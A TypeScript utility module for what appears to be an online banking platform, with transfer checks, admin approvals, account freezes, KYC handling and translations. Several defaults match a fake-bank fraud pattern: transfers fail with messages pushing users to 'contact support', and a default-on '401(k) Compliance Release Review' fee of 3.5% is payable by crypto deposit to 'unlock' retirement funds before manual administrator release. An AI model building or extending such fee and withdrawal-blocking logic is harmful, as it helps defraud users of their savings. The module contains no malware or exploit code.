type BroadcastTarget = "ALL_USERS" | "APPROVED_USERS" | "KYC_PENDING_USERS" | "SELECTED_USERS";
type KycStatus = "PENDING" | "UNDER_REVIEW" | "APPROVED" | "REJECTED" | "INFO_REQUESTED";
type Role = "USER" | "ADMIN";

export const defaultTransferSettings = {
  successMessage: "Transfer submitted successfully.",
  reviewMessage: "Your transaction requires additional review. Please contact customer support for assistance.",
  failedMessage: "Transfer could not be submitted. Additional verification is required before this transaction can be completed.",
  blockedMessage: "Transfer is blocked until additional account verification is completed.",
  reasonText: "Additional verification is required before this transaction can be completed.",
  buttonText: "CONTACT SUPPORT",
  supportInstructions:
    "A support specialist can verify your transfer and collect any additional documentation required by compliance.",
  referencePrefix: "GCLB"
};

export function formatTransferReference(prefix: string | null | undefined, id: string) {
  const cleanPrefix = (prefix || defaultTransferSettings.referencePrefix).replace(/[^A-Z0-9]/gi, "").toUpperCase() || "GCLB";
  return `${cleanPrefix}-${id.slice(-8).toUpperCase()}`;
}

export const defaultRetirementWithdrawalMessage =
  "Your 401(k) withdrawal request has been submitted for compliance review. Support may contact you if more information is required.";

export const defaultRetirementFeeSettings = {
  feeName: "401(k) Compliance Release Review",
  feePercentage: 3.5,
  feeReason:
    "Required compliance review deposit to unlock eligible 401(k) funds before manual administrator release.",
  paymentMethod: "CRYPTO_DEPOSIT",
  enabled: true,
  complianceMessage: defaultRetirementWithdrawalMessage
};

export function calculateRetirementFee(amount: number, setting: { feePercentage: number; enabled: boolean }) {
  if (!setting.enabled) {
    return { amount: 0, enabled: false };
  }

  return {
    amount: Math.round(amount * (setting.feePercentage / 100) * 100) / 100,
    enabled: true
  };
}

/* ── Transfer business logic (pure, unit-testable) ───────────────── */

export type TransferEligibility =
  | { ok: true }
  | { ok: false; reason: string };

/** Whether a user may submit a transfer from an account. */
export function canSubmitTransfer(params: {
  amount: number;
  currency: string;
  account: { availableBalance: number; currency: string; status: string };
}): TransferEligibility {
  const { amount, currency, account } = params;
  if (account.status !== "ACTIVE") {
    return { ok: false, reason: "Source account is not active." };
  }
  if (!Number.isFinite(amount) || amount <= 0) {
    return { ok: false, reason: "Transfer amount must be greater than zero." };
  }
  if (currency !== account.currency) {
    return { ok: false, reason: "Transfer currency must match the source account currency." };
  }
  if (amount > account.availableBalance) {
    return { ok: false, reason: "Insufficient available balance for this transfer." };
  }
  return { ok: true };
}

const TERMINAL_TRANSFER_STATUSES = new Set(["APPROVED", "REJECTED", "CANCELLED"]);

export function isTransferTerminal(status: string): boolean {
  return TERMINAL_TRANSFER_STATUSES.has(status);
}

export type ApprovalOutcome =
  | { ok: true; debit: number; newAvailable: number; newBalance: number }
  | { ok: false; reason: string };

/**
 * Compute the result of an admin approving a transfer.
 * Pure: returns the debit and resulting balances, or a rejection reason.
 */
export function computeApprovalDebit(params: {
  currentStatus: string;
  amount: number;
  account: { availableBalance: number; balance: number; status: string };
}): ApprovalOutcome {
  const { currentStatus, amount, account } = params;
  if (isTransferTerminal(currentStatus)) {
    return { ok: false, reason: `Transfer is already ${currentStatus.toLowerCase()}.` };
  }
  if (account.status !== "ACTIVE") {
    return { ok: false, reason: "Source account is not active; cannot approve." };
  }
  if (!Number.isFinite(amount) || amount <= 0) {
    return { ok: false, reason: "Invalid transfer amount." };
  }
  if (amount > account.availableBalance) {
    return { ok: false, reason: "Insufficient available balance to approve this transfer." };
  }
  return {
    ok: true,
    debit: amount,
    newAvailable: Math.round((account.availableBalance - amount) * 100) / 100,
    newBalance: Math.round((account.balance - amount) * 100) / 100
  };
}


export const translations = {
  en: {
    dashboard: "Dashboard",
    accounts: "Accounts",
    transfers: "Transfers",
    support: "Support",
    profile: "Profile",
    admin: "Admin Command Center",
    wallets: "Wallets",
    cards: "Cards"
    ,
    retirement: "401(k)"
  },
  es: {
    dashboard: "Panel",
    accounts: "Cuentas",
    transfers: "Transferencias",
    support: "Soporte",
    profile: "Perfil",
    admin: "Centro de Comando",
    wallets: "Billeteras",
    cards: "Tarjetas",
    retirement: "401(k)"
  },
  fr: {
    dashboard: "Tableau de bord",
    accounts: "Comptes",
    transfers: "Virements",
    support: "Assistance",
    profile: "Profil",
    admin: "Centre de commande",
    wallets: "Portefeuilles",
    cards: "Cartes",
    retirement: "401(k)"
  }
} as const;

export function getTranslation(locale: string, key: keyof typeof translations.en) {
  const dictionary = translations[locale as keyof typeof translations] ?? translations.en;
  return dictionary[key] ?? translations.en[key];
}

export function filterEnabledWallets<T extends { enabled: boolean }>(wallets: T[]) {
  return wallets.filter((wallet) => wallet.enabled);
}

export function resolveBroadcastRecipients(
  users: Array<{ id: string; email: string; kycStatus: KycStatus }>,
  target: BroadcastTarget,
  selectedUserIds: string[] = []
) {
  const selected = new Set(selectedUserIds);

  return users
    .filter((user) => {
      if (target === "ALL_USERS") {
        return true;
      }
      if (target === "APPROVED_USERS") {
        return user.kycStatus === "APPROVED";
      }
      if (target === "KYC_PENDING_USERS") {
        return user.kycStatus === "PENDING" || user.kycStatus === "UNDER_REVIEW";
      }
      return selected.has(user.id);
    })
    .map((user) => user.email);
}

export function getActiveAnnouncements<T extends {
  active: boolean;
  audience: Role | null;
  locale: string;
  startsAt: Date | string | null;
  endsAt: Date | string | null;
}>(banners: T[], role: Role, locale: string, now = new Date()) {
  return banners.filter((banner) => {
    if (!banner.active) {
      return false;
    }
    if (banner.audience && banner.audience !== role) {
      return false;
    }
    if (banner.locale !== locale) {
      return false;
    }
    if (banner.startsAt && new Date(banner.startsAt) > now) {
      return false;
    }
    if (banner.endsAt && new Date(banner.endsAt) < now) {
      return false;
    }
    return true;
  });
}

export function summarizeFreezeStatus(account: {
  status: string;
  freezeReason: string | null;
  frozenAt: Date | string | null;
}) {
  return {
    frozen: account.status === "FROZEN",
    reason: account.status === "FROZEN" ? account.freezeReason : null,
    frozenAt: account.status === "FROZEN" ? account.frozenAt : null
  };
}

export function latestKycStatus(submissions: Array<{ status: KycStatus; createdAt: Date }>) {
  return [...submissions].sort((left, right) => right.createdAt.getTime() - left.createdAt.getTime())[0]?.status ?? "PENDING";
}
